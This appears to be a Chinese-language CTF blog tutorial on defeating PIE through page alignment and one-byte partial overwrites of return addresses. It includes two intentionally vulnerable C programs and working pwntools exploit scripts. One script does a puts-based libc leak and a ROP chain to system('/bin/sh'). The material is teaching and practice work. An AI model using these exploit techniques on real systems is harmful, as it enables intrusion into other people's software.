页对齐机制绕过PIE保护

发表于2026-05-28|更新于2026-05-28|逆向PWN
|浏览量:

页对齐：说明程序内存段的开始和结束地址其末尾都是0x000，在gdb的时候使用vmmap命令可见端倪。

所以程序的末3位是永远不会被影响的。

所以我们可以通过动态调试，先获取后门函数的最后3位，但是构造payload的时候记得多溢出一个字节就可以了。

例题1（pie）：

#include <stdio.h>

void init(){

    setbuf(stdin, 0);

    setbuf(stdout, 0);

    setbuf(stderr, 0);

}

void vuln1(){

    vuln2();

}

void vuln2(){

    char buf[8];

    puts(“>>”);

    read(0, buf, 0x100);

}

void backdoor(){

    system(“/bin/sh”);

}

int main(){

    init();

    vuln1();

    return 0;

}

// gcc pie.c -o pie -fno-stack-protector

开了PIE保护的在调试的时候一定要记得打打断点用**”b $rebase(0x123a)”*

首先我们在IDA中查看后门函数的最后最后一个字节，在retn打断点

 

然后就可以看到程序页对其的基地址+偏移就是函数地址

 

所以真正随机化的都是前面部分，最后的三位肯定是固定不变的。

在继续对比我们的默认返回地址和函数地址就会发现，它真正改变的只有最后一个字节

 

所以我们在溢出的时候只需要多溢出一个字节把它覆盖成43即可。非常巧妙

from pwn import *

context(os=’linux’,arch=’amd64’,log_level=’debug’)

p = process(‘./pie’)

elf = ELF(‘./pie’)

libc = ELF(‘/lib/x86_64-linux-gnu/libc.so.6’)

gdb.attach(p, ‘b *$rebase(0x123a)’)

offset = 0x10

payload = offset*b’a’ + p8(0x43)

p.sendafter(b’>>\n’, payload)

pause()

p.interactive()

例题2(pie_two)：

#include <stdio.h>

void init(){

    setbuf(stdin, 0);

    setbuf(stdout, 0);

    setbuf(stderr, 0);

}

void vuln(){

    char buf[8];

    puts(“>>”);

    read(0, buf, 0x100);

    printf(“is %s\n”, (char *)buf);

}

int main(){

    init();

    puts(“Hello, Hacker!”);

    vuln();

    return 0;

}

// gcc pie_two.c -o pie_two -fno-stack-protector

通过观察IDA分析，得知：

如果是一般的题形，可以直接通过栈溢出漏洞覆盖返回地址来做libc或者shellcode，但是这题开了PIE保护，程序地址还不知道，所以我们只能知道看能否用prtintf函数泄露一些信息，这样才能考虑其他。所以我们可以断点打在call prinf函数上调试一下：

 

 

b *$rebase(0x1236)

必须再次调用vuln函数，可以先看到IDA中显示的vuln函数的开头位置是0x11f5

在原来的返回地址是正常的程序地址，根据页对其原则算出vuln开头指令的程序地址计算，再对比一下，发现只有最后三位都是不一样的，这让我们构造溢出的时候，很不好收，因为我们知道只能一个字节一个字节也就是两位两位来算

 

那么这样我们怎么才能绕过PIE，准确覆盖到我们想要的地方去呢？？？

（虽然爆破那一位也有可能，但是不弄）

遇到这种情况，可以观察寄存器！！！

继续单步执行到retn指令，发现RDI寄存器指向的竟然是一个libc地址（\x7f开头经验所得）

此时正好程序中又puts函数，而RDI又是第一个参数，那么岂不是刚好可以构造返回到puts函数，泄露libc地址，然后vuln函数恰巧也又执行一遍，直接打libc

 

再而后还可以发现，程序默认返回的是0x1266，而我们要构造的puts在0x1257，发现又只有最后一个字节也就是两位不同了，解决了三位不同的问题。

所以只需要多溢出一字节p8(0x57)就会跳到puts函数。

然后就注意计算libc地址的时候，那个函数不一定能在libc文件中用sym找到，就只能自己手动计算，如下：

 

方法一 断点调试frintf，问题是函数最后三位不一样，不好溢出，可能需要爆破

但是看寄存器，发现RDI寄存器保存了一个函数地址，可以通过puts函数泄露函数地址

会发现这样又调用了一次vuln函数

可以计算出libc_base 然后通过libc文件构造ROP,前提是需要提供libc文件才能正常打linc

ROPgadget –binary /lib/x86_64-linux-gnu/libc.so.6 –only “pop|ret” | grep “rdi”

from pwn import *

context(os=’linux’,arch=’amd64’,log_level=’debug’)

p = process(‘./pie_two’)

elf = ELF(‘./pie_two’)

libc = ELF(‘/lib/x86_64-linux-gnu/libc.so.6’)

gdb.attach(p,’b *$rebase(0x1236)’)

payload = 0x10*b’a’ + p8(0x57)

p.sendafter(b’>>\n’,payload)

funlockfile = u64(p.recvuntil(b’\x7f’)[-6:].ljust(8,b’\x00’))

libc_base = funlockfile - libc.sym[‘funlockfile’]#找不到就自己算

system = libc_base + libc.sym[‘system’]

bin_sh = libc_base + next(libc.search(b’/bin/sh\x00’))

开始执行第二遍vuln

rdi = libc_base + 0x2a3e5

ret = libc_base + 0x29cd6

payload = 0x10*b’a’ + p64(ret) + p64(rdi) + p64(bin_sh) + p64(system)

p.sendafter(b’>>\n’,payload)

pause()

p.interactive()

方法2：

还有一方法，直接覆盖成vuln函数，因为call vuln函数的地址和程序默认的返回地址还是只差最后一个字节不同。所以可以通过printf得到的程序地址-减去-IDA看到的指令偏移，就得到程序基址。

再打libc…
